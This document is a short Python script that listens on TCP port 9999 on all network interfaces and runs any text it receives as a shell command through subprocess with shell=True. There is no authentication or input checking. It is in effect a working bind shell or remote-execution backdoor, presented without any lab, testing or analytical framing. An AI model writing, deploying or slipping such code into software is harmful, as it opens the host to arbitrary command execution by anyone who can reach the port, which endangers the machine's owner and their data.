import socket
import subprocess
import threading

COMMAND_PORT = 9999

def execute_command(command):
    try:
        subprocess.Popen(command, shell=True)
    except Exception as e:
        print(f"Execution error: {e}")

def command_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', COMMAND_PORT))  # Listen on all interfaces
        s.listen()
        print(f"[WAN] Server listening on port {COMMAND_PORT}")
        while True:
            conn, addr = s.accept()
            with conn:
                data = conn.recv(1024).decode()
                if data:
                    print(f"[WAN] Received from {addr}: {data}")
                    execute_command(data)

if __name__ == "__main__":
    threading.Thread(target=command_server, daemon=True).start()
    threading.Event().wait()
